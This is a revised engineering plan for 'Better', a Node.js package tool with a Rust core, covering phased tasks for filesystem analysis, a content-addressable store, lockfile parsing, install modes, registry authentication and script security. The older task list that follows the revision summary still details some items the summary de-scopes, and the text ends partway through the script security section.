# Better vNext - Rust Core Acceleration + Materializer Track (Revised)

## Executive Summary

This plan is revised to align with Better’s “incrementally adoptable toolkit” direction while solving the real bottleneck: **fast, correct filesystem accounting and dependency analysis**.

**Primary goal:** sub-10-second analysis for multi-GB `node_modules`, and a path toward a **lockfile-replay materializer** that dramatically reduces install I/O and disk usage.

**Architecture:** TypeScript/Node CLI + Rust core (`better-core`) for hot paths.

**Implementation constraint (important):**
- MVP must work **offline** and in **sandboxed** environments.
- Prefer a **std-only Rust binary** with JSON IPC over N-API / napi-rs and over external crates.
  - Rationale: avoids dependency downloads, avoids Node ABI issues, simplest distribution.

Important scope change vs the original draft:
- Better **does not** introduce a new mandatory lockfile (`better.lock`) in the near term.
- Better **does not** attempt a full Yarn PnP “exact port” as a default install mode.
- The “installer” direction is defined as **lockfile replay / materialization** (no resolution) to preserve trust.

For the consolidated direction (Bun engine + parity checks + Rust core + materializer), see:
- `.omc/plans/better-vnext.md`

---

## Phase 0: Adopt Rust Core Without Nuking the Repo

The original plan started with deleting all existing code. That is no longer recommended.
Instead:
- keep the existing CLI surface stable
- introduce Rust core behind feature flags and size thresholds
- migrate hot paths incrementally

### Task 0.1: Add Rust core skeleton
- Create `crates/better-core` as a Rust binary (preferred first) or `napi-rs` addon (later).
- Expose a stable JSON interface for:
  - `scan` (logical/physical sizing)
  - `analyze` (package discovery + sizes + duplicates + depth)

Acceptance:
- `better-core analyze --json <path>` prints deterministic JSON for fixtures

---

## Phase 1: Rust File Walker + Hardlink-Aware Accounting (P0)

Keep Task 1.1 and 1.2 from the original plan with one emphasis:
- prioritize correctness on Windows file identity + symlink handling
- keep output deterministic (sorted traversal, stable hashing)

---

## Phase 2: Lockfile Replay Materializer (Experimental)

The “installer” path is re-scoped:
- **No dependency resolution** (lockfile is source of truth)
- **Materialize** `node_modules` via CAS + hardlink/reflink/copy
- Scripts/native addons handled conservatively with fallbacks

---

## De-scoped / Research (Not MVP, Not Default)

The following items remain interesting but are explicitly non-default:
- A new canonical `better.lock` format (optional acceleration index at most)
- Full Yarn PnP “exact port”
- Full replacement resolver (`better add/update`) for all edge cases


### Task 0.2: Initialize Monorepo Structure
- **Commit**: `chore: initialize pnpm workspace monorepo structure`
- **Files to CREATE**:
  - `/pnpm-workspace.yaml`
  - `/package.json` (root workspace config)
  - `/tsconfig.base.json` (shared TypeScript config)
  - `/.npmrc` (pnpm settings)
  - `/.gitignore` (updated for Rust artifacts)
- **Acceptance Criteria**:
  - `pnpm install` works at root
  - Workspace structure ready for packages
  - Git ignores `target/`, `node_modules/`, `*.node`
- **Dependencies**: Task 0.1

### Task 0.3: Initialize Rust Workspace
- **Commit**: `chore: initialize Rust workspace with napi-rs`
- **Files to CREATE**:
  - `/crates/Cargo.toml` (workspace root)
  - `/crates/better-core/Cargo.toml`
  - `/crates/better-core/src/lib.rs` (napi-rs entry point)
  - `/crates/better-core/build.rs`
  - `/crates/better-core/.cargo/config.toml`
  - `/rust-toolchain.toml`
- **Acceptance Criteria**:
  - `cargo build` succeeds in `/crates`
  - napi-rs bindings compile to `.node` file
  - Basic "hello world" function callable from Node.js
- **Dependencies**: Task 0.2

### Task 0.4: Setup TypeScript CLI Package
- **Commit**: `chore: initialize TypeScript CLI package structure`
- **Files to CREATE**:
  - `/packages/cli/package.json`
  - `/packages/cli/tsconfig.json`
  - `/packages/cli/src/index.ts`
  - `/packages/cli/src/cli.ts`
  - `/packages/cli/bin/better.js`
- **Acceptance Criteria**:
  - `pnpm build` compiles TypeScript
  - `./bin/better.js --help` runs (shows placeholder)
  - Can import native addon (from Task 0.3)
- **Dependencies**: Task 0.3

### Task 0.5: Setup Development Tooling
- **Commit**: `chore: configure development tooling and CI`
- **Files to CREATE**:
  - `/biome.json` (replaces ESLint + Prettier)
  - `/.github/workflows/ci.yml`
  - `/.github/workflows/release.yml`
  - `/packages/cli/vitest.config.ts`
  - `/crates/better-core/tests/integration.rs`
- **Acceptance Criteria**:
  - `pnpm lint` works
  - `pnpm test` runs both TS and Rust tests
  - CI workflow validates on push
- **Dependencies**: Task 0.4

---

## Phase 1: Rust Core Foundation

### Task 1.1: Implement Parallel File Walker
- **Commit**: `feat(core): implement parallel file system walker`
- **Files to CREATE**:
  - `/crates/better-core/src/fs/mod.rs`
  - `/crates/better-core/src/fs/walker.rs`
  - `/crates/better-core/src/fs/entry.rs`
- **Implementation Details**:
  - Use `ignore` crate for gitignore-aware walking
  - Use `rayon` for parallel directory traversal
  - Use `crossbeam-channel` for work stealing
  - Return file metadata (size, inode, mtime)
- **Acceptance Criteria**:
  - Walk 100k files in under 1 second
  - Respect `.gitignore` patterns
  - Return accurate file sizes
  - Expose via napi-rs to Node.js
- **Dependencies**: Task 0.5

### Task 1.2: Implement Size Calculator with Hardlink Awareness
- **Commit**: `feat(core): implement hardlink-aware size calculation`
- **Files to CREATE**:
  - `/crates/better-core/src/fs/size.rs`
  - `/crates/better-core/src/fs/inode_map.rs`
- **Implementation Details**:
  - Track inodes to detect hardlinks
  - Calculate "logical" vs "physical" size
  - Use `dashmap` for concurrent inode tracking
  - Report deduplication savings
- **Acceptance Criteria**:
  - Correctly identify hardlinked files
  - Report both logical and physical sizes
  - Handle cross-device scenarios
  - Performance: 2.2GB node_modules in <2 seconds
- **Dependencies**: Task 1.1

### Task 1.3: Implement Package.json Parser
- **Commit**: `feat(core): implement fast package.json parser`
- **Files to CREATE**:
  - `/crates/better-core/src/manifest/mod.rs`
  - `/crates/better-core/src/manifest/package_json.rs`
  - `/crates/better-core/src/manifest/types.rs`
- **Implementation Details**:
  - Use `simd-json` for fast parsing
  - Extract: name, version, dependencies, devDependencies, peerDependencies
  - Handle malformed package.json gracefully
  - Cache parsed results
- **Acceptance Criteria**:
  - Parse 10k package.json files in <500ms
  - Handle all npm package.json variants
  - Graceful error handling for malformed JSON
- **Dependencies**: Task 1.1

### Task 1.4: Implement Dependency Graph Builder
- **Commit**: `feat(core): implement dependency graph construction`
- **Files to CREATE**:
  - `/crates/better-core/src/graph/mod.rs`
  - `/crates/better-core/src/graph/builder.rs`
  - `/crates/better-core/src/graph/node.rs`
  - `/crates/better-core/src/graph/edge.rs`
- **Implementation Details**:
  - Build directed graph from node_modules structure
  - Use `petgraph` for graph operations
  - Track: package name, version, location, dependencies
  - Support both flat and nested node_modules
- **Acceptance Criteria**:
  - Build graph for 1000+ packages in <1 second
  - Detect circular dependencies
  - Support workspace packages
  - Expose graph to Node.js as JSON
- **Dependencies**: Task 1.3

### Task 1.5: Implement Cycle Detection
- **Commit**: `feat(core): implement cycle detection in dependency graph`
- **Files to CREATE**:
  - `/crates/better-core/src/graph/cycles.rs`
  - `/crates/better-core/src/graph/tarjan.rs`
- **Implementation Details**:
  - Implement Tarjan's SCC algorithm
  - Report all cycles, not just first found
  - Calculate cycle depth/severity
  - Suggest breaking points
- **Acceptance Criteria**:
  - Detect all cycles in graph
  - Report cycle paths clearly
  - Rank cycles by severity
  - O(V+E) performance
- **Dependencies**: Task 1.4

### Task 1.6: Implement Duplicate Detection
- **Commit**: `feat(core): implement duplicate package detection`
- **Files to CREATE**:
  - `/crates/better-core/src/analysis/mod.rs`
  - `/crates/better-core/src/analysis/duplicates.rs`
- **Implementation Details**:
  - Find packages with same name, different versions
  - Calculate wasted space from duplicates
  - Suggest deduplication opportunities
  - Support semver-aware duplicate detection
- **Acceptance Criteria**:
  - Find all duplicate packages
  - Calculate exact space waste
  - Suggest which versions to consolidate
  - Report semver compatibility
- **Dependencies**: Task 1.4

---

## Phase 2: Content-Addressable Store

### Task 2.1: Implement SHA256 Content Hashing
- **Commit**: `feat(core): implement content-addressable hashing`
- **Files to CREATE**:
  - `/crates/better-core/src/cas/mod.rs`
  - `/crates/better-core/src/cas/hasher.rs`
  - `/crates/better-core/src/cas/integrity.rs`
- **Implementation Details**:
  - Use `ring` or `sha2` crate for SHA256
  - Parallel hashing with rayon
  - Support streaming for large files
  - Generate pnpm-compatible integrity hashes
- **Acceptance Criteria**:
  - Hash 1GB of files in <2 seconds
  - Compatible with npm/pnpm integrity format
  - Verify file integrity on retrieval
- **Dependencies**: Task 1.1

### Task 2.2: Implement Store Layout
- **Commit**: `feat(core): implement content-addressable store layout`
- **Files to CREATE**:
  - `/crates/better-core/src/cas/store.rs`
  - `/crates/better-core/src/cas/path.rs`
  - `/crates/better-core/src/cas/metadata.rs`
- **Implementation Details**:
  - Store at `~/.better/store/`
  - Path format: `{hash[0..2]}/{hash[2..4]}/{hash}`
  - Store metadata alongside content
  - Support atomic writes (write to temp, rename)
- **Acceptance Criteria**:
  - Store and retrieve files by hash
  - Atomic writes prevent corruption
  - Metadata tracks source package info
  - Clean up orphaned files
- **Dependencies**: Task 2.1

### Task 2.3: Implement Hardlink Manager
- **Commit**: `feat(core): implement hardlink/reflink manager`
- **Files to CREATE**:
  - `/crates/better-core/src/cas/linker.rs`
  - `/crates/better-core/src/cas/reflink.rs`
- **Implementation Details**:
  - Prefer reflink (copy-on-write) where supported
  - Fall back to hardlink
  - Fall back to copy on cross-device
  - Track link counts for GC
- **Acceptance Criteria**:
  - Create hardlinks on Linux/macOS
  - Use reflinks on APFS/Btrfs
  - Handle cross-filesystem gracefully
  - Report space savings
- **Dependencies**: Task 2.2

### Task 2.4: Implement Store Garbage Collection
- **Commit**: `feat(core): implement store garbage collection`
- **Files to CREATE**:
  - `/crates/better-core/src/cas/gc.rs`
  - `/crates/better-core/src/cas/refs.rs`
- **Implementation Details**:
  - Mark-and-sweep GC algorithm
  - Track references from project lockfiles
  - Remove unreferenced content
  - Support dry-run mode
- **Acceptance Criteria**:
  - Remove orphaned content safely
  - Never delete referenced content
  - Report space reclaimed
  - Support --dry-run flag
- **Dependencies**: Task 2.3

---

## Phase 3: Lockfile Support

### Task 3.1: Implement package-lock.json Parser
- **Commit**: `feat(core): implement package-lock.json parser`
- **Files to CREATE**:
  - `/crates/better-core/src/lockfile/mod.rs`
  - `/crates/better-core/src/lockfile/npm.rs`
  - `/crates/better-core/src/lockfile/types.rs`
- **Implementation Details**:
  - Support lockfileVersion 1, 2, and 3
  - Extract: resolved URLs, integrity, dependencies
  - Handle workspaces
  - Use simd-json for parsing
- **Acceptance Criteria**:
  - Parse all npm lockfile versions
  - Extract complete dependency tree
  - Handle edge cases (bundled deps, optional)
  - <100ms for typical lockfile
- **Dependencies**: Task 1.3

### Task 3.2: Implement pnpm-lock.yaml Parser
- **Commit**: `feat(core): implement pnpm-lock.yaml parser`
- **Files to CREATE**:
  - `/crates/better-core/src/lockfile/pnpm.rs`
- **Implementation Details**:
  - Support pnpm lockfile v6 and v9
  - Parse YAML with `serde_yaml`
  - Extract: snapshots, packages, importers
  - Handle pnpm workspace protocol
- **Acceptance Criteria**:
  - Parse both lockfile versions
  - Extract complete dependency info
  - Handle workspace: protocol
  - <100ms for typical lockfile
- **Dependencies**: Task 3.1

### Task 3.3: Implement yarn.lock Parser
- **Commit**: `feat(core): implement yarn.lock parser (classic + berry)`
- **Files to CREATE**:
  - `/crates/better-core/src/lockfile/yarn_classic.rs`
  - `/crates/better-core/src/lockfile/yarn_berry.rs`
- **Implementation Details**:
  - Yarn Classic: custom format parser
  - Yarn Berry: YAML format
  - Handle resolution aliases
  - Support workspace ranges
- **Acceptance Criteria**:
  - Parse both Yarn formats
  - Handle all resolution types
  - Support workspaces
  - <100ms for typical lockfile
- **Dependencies**: Task 3.1

### Task 3.4: Implement better.lock Format
- **Commit**: `feat(core): implement better.lock binary format`
- **Files to CREATE**:
  - `/crates/better-core/src/lockfile/better.rs`
  - `/crates/better-core/src/lockfile/binary.rs`
  - `/docs/better-lock-format.md`
- **Implementation Details**:
  - **Binary Format Structure**:
    ```
    Header (fixed size):
    - Magic bytes: "BTLK" (4 bytes)
    - Version: u16 (2 bytes) - current: 1
    - Flags: u16 (2 bytes) - reserved for future use
    - Body checksum: SHA256 (32 bytes)
    - Body length: u64 (8 bytes)
    Total header: 48 bytes

    Body: MessagePack-encoded BetterLockfile struct
    ```
  - **Rust Schema Definitions**:
    ```rust
    #[derive(Serialize, Deserialize)]
    struct BetterLockfile {
        lockfile_version: u8,  // Always 1 for now
        packages: HashMap<PackageId, PackageEntry>,
        importers: HashMap<String, ImporterEntry>,  // workspace packages
        settings: LockfileSettings,
    }

    #[derive(Serialize, Deserialize)]
    struct PackageEntry {
        name: String,
        version: String,
        resolution: Resolution,
        integrity: String,  // "sha512-..." format
        dependencies: HashMap<String, String>,  // name -> version
        optional_dependencies: HashMap<String, String>,
        peer_dependencies: HashMap<String, PeerDep>,
        bin: Option<HashMap<String, String>>,
        engines: Option<Engines>,
        os: Option<Vec<String>>,
        cpu: Option<Vec<String>>,
        has_install_script: bool,
        requires_build: bool,
    }

    #[derive(Serialize, Deserialize)]
    enum Resolution {
        Registry { url: String, tarball: String },
        Git { repo: String, commit: String },
        Path { path: String },
        Link { path: String },
        Workspace { path: String },
    }

    #[derive(Serialize, Deserialize)]
    struct ImporterEntry {
        dependencies: HashMap<String, DependencySpec>,
        dev_dependencies: HashMap<String, DependencySpec>,
        optional_dependencies: HashMap<String, DependencySpec>,
    }

    #[derive(Serialize, Deserialize)]
    struct DependencySpec {
        specifier: String,  // Original specifier from package.json
        resolved: String,   // PackageId it resolved to
    }
    ```
  - **TOML Companion File** (`better.lock.toml`):
    - Human-readable, Git-diffable companion
    - Generated alongside binary lockfile
    - Format:
      ```toml
      [metadata]
      version = 1
      generated = "2026-02-04T12:00:00Z"

      [settings]
      installation_mode = "hardlink"  # or "pnp"

      [importers."packages/cli"]
      dependencies = { commander = "^12.0.0" }

      [packages."commander@12.0.0"]
      integrity = "sha512-..."
      resolution = { type = "registry", url = "https://registry.npmjs.org" }
      ```
  - Use `rmp-serde` crate for MessagePack encoding
  - Use `sha2` crate for checksum
- **Acceptance Criteria**:
  - Parse in <10ms (vs 100ms for JSON/YAML)
  - Generate diff-friendly TOML companion file
  - Round-trip without data loss
  - Document format specification in `/docs/better-lock-format.md`
  - Checksum validation on load (fail if tampered)
  - Version check with clear migration path
- **Dependencies**: Task 3.1

### Task 3.5: Implement Lockfile Migration
- **Commit**: `feat(core): implement lockfile migration between formats`
- **Files to CREATE**:
  - `/crates/better-core/src/lockfile/migrate.rs`
  - `/crates/better-core/src/lockfile/resolver.rs`
- **Implementation Details**:
  - Convert any lockfile to better.lock
  - Preserve integrity hashes where possible
  - Re-resolve missing integrity
  - Maintain compatibility info
- **Acceptance Criteria**:
  - Migrate npm/pnpm/yarn to better.lock
  - No resolution changes (same versions)
  - Preserve all integrity information
  - Report migration summary
- **Dependencies**: Task 3.4

---

## Phase 4: Installation Engines

### Task 4.1: Implement Hardlink Installation Mode
- **Commit**: `feat(core): implement hardlink installation mode`
- **Files to CREATE**:
  - `/crates/better-core/src/install/mod.rs`
  - `/crates/better-core/src/install/hardlink.rs`
  - `/crates/better-core/src/install/layout.rs`
- **Implementation Details**:
  - pnpm-style: store + node_modules/.pnpm + symlinks
  - Parallel file operations with rayon
  - Atomic package installation
  - Handle .bin linking
- **Acceptance Criteria**:
  - Install 1000 packages in <5 seconds
  - Correct .bin symlinks
  - Handle postinstall scripts
  - Space savings reported
- **Dependencies**: Task 2.3, Task 3.4

### Task 4.2: Implement PnP Installation Mode
- **Commit**: `feat(core): implement PnP installation mode`
- **Files to CREATE**:
  - `/crates/better-core/src/install/pnp.rs`
  - `/crates/better-core/src/pnp/mod.rs`
  - `/crates/better-core/src/pnp/map.rs`
  - `/crates/better-core/src/pnp/loader.rs`
  - `/crates/better-core/src/pnp/runtime.rs`
  - `/crates/better-core/src/pnp/unplug.rs`
- **Implementation Details**:
  - **Port Yarn Berry's PnP Specification Exactly**:
    - Reference: https://yarnpkg.com/advanced/pnp-spec
    - Compatibility goal: Drop-in replacement for Yarn PnP
  - **`.pnp.cjs` Generation**:
    ```javascript
    // Generated structure (Rust generates this JavaScript)
    const RAW_RUNTIME_STATE = {
      __info: ["Better", "2.0.0"],
      dependencyTreeRoots: [
        { name: "my-project", reference: "workspace:." }
      ],
      packageRegistryData: [
        // [name, [
        //   [reference, { packageLocation, packageDependencies, linkType }]
        // ]]
        ["lodash", [
          ["4.17.21", {
            packageLocation: "./.pnp/cache/lodash-npm-4.17.21-abc123.zip/node_modules/lodash/",
            packageDependencies: new Map([]),
            linkType: "HARD"
          }]
        ]]
      ],
      packageLocatorsByLocations: new Map([
        // location -> { name, reference }
      ])
    };
    ```
  - **`.pnp.loader.mjs` for ESM Support**:
    ```javascript
    // Generated ESM loader hook
    import { resolve as pnpResolve, load as pnpLoad } from './.pnp.cjs';
    export { pnpResolve as resolve, pnpLoad as load };
    ```
  - **Auto-Unplug Rules** (packages extracted to disk):
    - Native modules (`.node` files, node-gyp)
    - Packages with `postinstall`, `preinstall`, `install` scripts
    - Packages with `bin` entries
    - Packages explicitly listed in `better.config.toml`:
      ```toml
      [pnp]
      unplug = ["esbuild", "sharp", "@swc/core"]
      ```
  - **Unplug Directory Structure**:
    ```
    .pnp/
    ├── cache/           # Zipped packages
    │   └── lodash-npm-4.17.21-abc123.zip
    └── unplugged/       # Extracted packages
        └── esbuild-npm-0.19.0-def456/
            └── node_modules/
                └── esbuild/
    ```
  - **Package Location Algorithm**:
    1. Check if package is unplugged -> return unplugged path
    2. Check packageRegistryData for zip location
    3. Return virtual path inside zip: `{zip_path}/node_modules/{name}/`
- **Acceptance Criteria**:
  - Generate valid `.pnp.cjs` compatible with Yarn Berry format
  - Node.js resolves packages correctly with `--require .pnp.cjs`
  - ESM works with `--loader .pnp.loader.mjs`
  - Native modules auto-unplugged (detect via `binding.gyp`, `.node` files)
  - Packages with install scripts auto-unplugged
  - Manual unplug list in config respected
  - `node -e "require('lodash')"` works with PnP active
- **Dependencies**: Task 2.2, Task 3.4

### Task 4.3: Implement Zip Archive Support
- **Commit**: `feat(core): implement zip archive reading for PnP`
- **Files to CREATE**:
  - `/crates/better-core/src/pnp/zip.rs`
  - `/crates/better-core/src/pnp/virtual_fs.rs`
- **Implementation Details**:
  - Use `zip` crate for archive handling
  - Memory-map archives for performance
  - Support reading files within zips
  - Cache zip directory entries
- **Acceptance Criteria**:
  - Read files from zipped packages
  - Performance comparable to filesystem
  - Handle nested archives
  - Memory efficient
- **Dependencies**: Task 4.2

### Task 4.4: Implement Installation Diff
- **Commit**: `feat(core): implement installation diff for fast updates`
- **Files to CREATE**:
  - `/crates/better-core/src/install/diff.rs`
  - `/crates/better-core/src/install/patch.rs`
- **Implementation Details**:
  - Compare current vs target state
  - Only install/remove changed packages
  - Preserve unmodified content
  - Report changes made
- **Acceptance Criteria**:
  - Incremental install in <1 second (no changes)
  - Correctly detect all changes
  - Atomic updates (rollback on failure)
  - Report what changed
- **Dependencies**: Task 4.1

---

## Phase 4.5: Protocol Handling

### Task 4.5.1: Implement Dependency Protocol Resolver
- **Commit**: `feat(core): implement dependency protocol resolver`
- **Files to CREATE**:
  - `/crates/better-core/src/protocols/mod.rs`
  - `/crates/better-core/src/protocols/workspace.rs`
  - `/crates/better-core/src/protocols/file.rs`
  - `/crates/better-core/src/protocols/link.rs`
  - `/crates/better-core/src/protocols/git.rs`
  - `/crates/better-core/src/protocols/npm.rs`
- **Implementation Details**:
  - **Protocol Detection & Parsing**:
    ```rust
    #[derive(Debug, Clone)]
    enum DependencyProtocol {
        /// npm registry: "^1.0.0", "1.0.0", ">=1.0.0 <2.0.0"
        Npm(NpmSpec),
        /// workspace: "workspace:*", "workspace:^", "workspace:~"
        Workspace(WorkspaceSpec),
        /// file: "file:../local-pkg"
        File(PathBuf),
        /// link: "link:../local-pkg"
        Link(PathBuf),
        /// git: "git+https://...", "github:user/repo"
        Git(GitSpec),
        /// tarball URL: "https://example.com/pkg.tgz"
        Tarball(Url),
    }
    ```
  - **`workspace:` Protocol** (pnpm/yarn style):
    | Specifier | Meaning | Resolved Version |
    |-----------|---------|------------------|
    | `workspace:*` | Any version | Exact version from workspace package |
    | `workspace:^` | Caret range | `^{version}` |
    | `workspace:~` | Tilde range | `~{version}` |
    | `workspace:^1.0.0` | Explicit caret | `^1.0.0` (validated against workspace) |
    | `workspace:../path` | Path-based | Resolved to workspace package at path |
    ```rust
    #[derive(Debug, Clone)]
    enum WorkspaceSpec {
        Any,           // workspace:*
        Caret,         // workspace:^
        Tilde,         // workspace:~
        Exact(String), // workspace:1.0.0
        Range(String), // workspace:^1.0.0, workspace:>=1.0.0
        Path(PathBuf), // workspace:../packages/foo
    }

    fn resolve_workspace_spec(spec: &WorkspaceSpec, pkg_version: &str) -> String {
        match spec {
            WorkspaceSpec::Any => pkg_version.to_string(),
            WorkspaceSpec::Caret => format!("^{}", pkg_version),
            WorkspaceSpec::Tilde => format!("~{}", pkg_version),
            WorkspaceSpec::Exact(v) => v.clone(),
            WorkspaceSpec::Range(r) => r.clone(),
            WorkspaceSpec::Path(_) => pkg_version.to_string(),
        }
    }
    ```
  - **`file:` Protocol**:
    - Copy package to CAS with integrity hash
    - Resolve relative paths from package.json location
    - Generate integrity hash for lockfile
    ```rust
    struct FileResolution {
        source_path: PathBuf,       // Original path
        cas_hash: String,           // SHA256 of tarball/contents
        integrity: String,          // "sha512-..." for lockfile
        resolved_version: String,   // Version from package.json
    }

    fn resolve_file_protocol(spec: &str, context_dir: &Path) -> Result<FileResolution> {
        let path = spec.strip_prefix("file:").unwrap();
        let absolute = context_dir.join(path).canonicalize()?;
        let pkg_json = read_package_json(&absolute)?;
        let tarball = create_tarball(&absolute)?;
        let hash = sha256(&tarball);
        Ok(FileResolution {
            source_path: absolute,
            cas_hash: hash.clone(),
            integrity: format!("sha512-{}", base64(&sha512(&tarball))),
            resolved_version: pkg_json.version,
        })
    }
    ```
  - **`link:` Protocol**:
    - Create symlink (NOT copied to CAS)
    - No integrity hash (always resolves to current disk state)
    - Must be within project or explicitly allowed
    ```rust
    struct LinkResolution {
        source_path: PathBuf,
        target_path: PathBuf,  // Where symlink points
        resolved_version: String,
    }
    // Note: link: packages are NOT stored in CAS
    // They are symlinked directly to the source location
    ```
  - **`git:` Protocol**:
    | Format | Example |
    |--------|---------|
    | Full URL | `git+https://github.com/user/repo.git` |
    | SSH | `git+ssh://git@github.com/user/repo.git` |
    | GitHub shorthand | `github:user/repo` |
    | GitLab shorthand | `gitlab:user/repo` |
    | Bitbucket shorthand | `bitbucket:user/repo` |
    | With ref | `github:user/repo#branch` |
    | With semver | `github:user/repo#semver:^1.0.0` |
    | With commit | `github:user/repo#abc1234` |
    ```rust
    #[derive(Debug, Clone)]
    struct GitSpec {
        url: String,
        committish: Option<GitRef>,
    }

    #[derive(Debug, Clone)]
    enum GitRef {
        Branch(String),
        Tag(String),
        Commit(String),
        Semver(String),  // semver:^1.0.0 - resolved via git tags
    }

    fn resolve_git_protocol(spec: &GitSpec) -> Result<GitResolution> {
        // 1. Clone to temp directory (shallow if possible)
        // 2. Resolve committish:
        //    - Branch/Tag: git rev-parse
        //    - Semver: list tags, find matching semver, rev-parse
        //    - Commit: validate exists
        // 3. Read package.json for version
        // 4. Run `prepare` script if exists
        // 5. Create tarball, hash, store in CAS
        // 6. Return resolution with commit SHA (for reproducibility)
    }

    struct GitResolution {
        url: String,
        commit: String,          // Always resolved to full SHA
        resolved_version: String,
        cas_hash: String,
        integrity: String,
    }
    ```
  - **Registry (npm) Protocol**:
    - Default when no protocol prefix
    - Support all semver ranges
    - Support tags (`latest`, `next`, `beta`)
    - Support exact versions
    ```rust
    #[derive(Debug, Clone)]
    enum NpmSpec {
        Tag(String),           // "latest", "next"
        Exact(Version),        // "1.0.0"
        Range(VersionReq),     // "^1.0.0", ">=1.0.0 <2.0.0"
    }
    ```
- **Acceptance Criteria**:
  - All 6 protocol types parsed correctly
  - `workspace:` resolves to correct version format
  - `file:` copies to CAS with integrity
  - `link:` creates symlinks (no CAS)
  - `git:` clones, resolves refs, runs prepare, stores in CAS
  - Registry specs use auth from Task 5.3.1
  - Error messages clearly indicate protocol parsing failures
- **Dependencies**: Task 2.2, Task 3.4

---

## Phase 5: TypeScript CLI Layer

### Task 5.1: Implement CLI Command Router
- **Commit**: `feat(cli): implement command routing and argument parsing`
- **Files to CREATE**:
  - `/packages/cli/src/commands/index.ts`
  - `/packages/cli/src/commands/types.ts`
  - `/packages/cli/src/args.ts`
- **Implementation Details**:
  - Use `citty` or `commander` for parsing
  - Commands: install, analyze, doctor, serve, cache
  - Global flags: --json, --verbose, --quiet
  - Subcommand pattern
- **Acceptance Criteria**:
  - All commands routable
  - Help text for each command
  - JSON output mode works
  - Tab completion support
- **Dependencies**: Task 0.4

### Task 5.2: Implement Configuration System
- **Commit**: `feat(cli): implement configuration loading`
- **Files to CREATE**:
  - `/packages/cli/src/config/loader.ts`
  - `/packages/cli/src/config/schema.ts`
  - `/packages/cli/src/config/defaults.ts`
- **Implementation Details**:
  - Load: better.config.js, .betterrc, package.json#better
  - Merge with defaults
  - Validate with zod
  - Support extends for shared configs
- **Acceptance Criteria**:
  - All config sources loaded
  - Validation errors helpful
  - Defaults documented
  - TypeScript types exported
- **Dependencies**: Task 5.1

### Task 5.3: Implement Package Manager Detection
- **Commit**: `feat(cli): implement automatic package manager detection`
- **Files to CREATE**:
  - `/packages/cli/src/pm/detector.ts`
  - `/packages/cli/src/pm/types.ts`
- **Implementation Details**:
  - Detect by lockfile presence
  - Detect by packageManager field
  - Detect by .npmrc/.yarnrc.yml
  - Support explicit override
- **Acceptance Criteria**:
  - Detect npm/pnpm/yarn/bun
  - Detect version (yarn classic vs berry)
  - Override via --pm flag
  - Report detected PM
- **Dependencies**: Task 5.2

### Task 5.3.1: Implement Registry Authentication
- **Commit**: `feat(cli): implement registry authentication and .npmrc parsing`
- **Files to CREATE**:
  - `/packages/cli/src/registry/auth.ts`
  - `/packages/cli/src/registry/npmrc.ts`
  - `/packages/cli/src/registry/credentials.ts`
  - `/crates/better-core/src/registry/mod.rs`
  - `/crates/better-core/src/registry/auth.rs`
  - `/crates/better-core/src/registry/npmrc.rs`
- **Implementation Details**:
  - **`.npmrc` Resolution Chain** (in priority order):
    1. Project `.npmrc` (current directory)
    2. User `.npmrc` (`~/.npmrc`)
    3. Global `.npmrc` (`/etc/npmrc` or `$PREFIX/etc/npmrc`)
  - **Supported `.npmrc` Directives**:
    ```ini
    # Global registry
    registry=https://registry.npmjs.org/

    # Scoped registry
    @mycompany:registry=https://npm.mycompany.com/

    # Auth token (Bearer)
    //registry.npmjs.org/:_authToken=${NPM_TOKEN}

    # Basic auth
    //npm.mycompany.com/:_auth=base64encodedcreds
    //npm.mycompany.com/:username=user
    //npm.mycompany.com/:_password=base64password

    # Certificate auth
    //npm.mycompany.com/:certfile=/path/to/cert.pem
    //npm.mycompany.com/:keyfile=/path/to/key.pem
    ```
  - **Environment Variable Support**:
    - `BETTER_TOKEN` - Default token for all registries
    - `BETTER_TOKEN_<REGISTRY>` - Registry-specific token (registry name uppercased, dots/slashes to underscores)
      - Example: `BETTER_TOKEN_NPM_MYCOMPANY_COM` for `npm.mycompany.com`
    - `NPM_TOKEN` - Fallback for npm compatibility
    - `NPM_CONFIG_REGISTRY` - Override default registry
  - **Scoped Package Resolution**:
    ```rust
    fn get_registry_for_package(name: &str, config: &NpmrcConfig) -> RegistryInfo {
        if let Some(scope) = name.strip_prefix('@').and_then(|s| s.split('/').next()) {
            if let Some(scoped_registry) = config.scoped_registries.get(scope) {
                return scoped_registry.clone();
            }
        }
        config.default_registry.clone()
    }
    ```
  - **Security Requirements**:
    - Use `secrecy` crate for token handling (zeroize on drop)
    - NEVER log tokens (even at trace level)
    - NEVER include tokens in error messages
    - Mask tokens in debug output: `token: "npm_***"`
    - File permissions check: warn if `.npmrc` is world-readable
  - **Registry URL Normalization**:
    - Always ensure trailing slash
    - Handle both `https://registry.npmjs.org` and `https://registry.npmjs.org/`
    - Strip trailing `/` for auth matching, add for requests
- **Acceptance Criteria**:
  - Parse all `.npmrc` locations in correct priority
  - Environment variable interpolation works (`${VAR}` syntax)
  - Scoped packages use correct registry
  - Private registry auth works (Bearer and Basic)
  - Tokens never appear in logs or errors
  - Works with Artifactory, Nexus, GitHub Packages, npm Enterprise
- **Dependencies**: Task 5.3

### Task 5.4: Implement Install Command
- **Commit**: `feat(cli): implement install command`
- **Files to CREATE**:
  - `/packages/cli/src/commands/install.ts`
  - `/packages/cli/src/install/resolver.ts`
  - `/packages/cli/src/install/fetcher.ts`
- **Implementation Details**:
  - Parse package.json dependencies
  - Resolve versions via registry (using Task 5.3.1 auth)
  - Call Rust core for installation
  - Handle postinstall scripts (using Task 5.4.1 security model)
- **Acceptance Criteria**:
  - `better install` works
  - `better install <pkg>` adds package
  - `better install --pnp` uses PnP mode
  - `better install --hardlink` uses hardlink mode
  - Private registry packages install correctly
- **Dependencies**: Task 5.3, Task 5.3.1, Task 4.1, Task 4.2

### Task 5.4.1: Implement Script Security System
- **Commit**: `feat(cli): implement postinstall script security model`
- **Files to CREATE**:
  - `/packages/cli/src/scripts/executor.ts`
  - `/packages/cli/src/scripts/sandbox.ts`
  - `/packages/cli/src/scripts/audit.ts`
  - `/crates/better-core/src/scripts/mod.rs`
  - `/crates/better-core/src/scripts/sandbox.rs`
  - `/crates/better-core/src/scripts/audit.rs`
- **Implementation Details**:
  - **4-Tier Security Model**:
    | Tier | Name | Behavior |
    |------|------|----------|
    | 0 | `unrestricted` | Run all scripts (npm default, for backwards compat) |
    | 1 | `audit` | Run all scripts, log to audit file |
    | 2 | `allowlist` | Only run scripts from allowed packages |
    | 3 | `sandbox` | Run in OS-level sandbox |
  - **Configuration in `better.config.toml`**:
    ```toml
    [scripts]
    # Security tier (0-3)
    security = "audit"  # or "unrestricted", "allowlist", "sandbox"

    # Allowlist for tier 2 (allowlist mode)
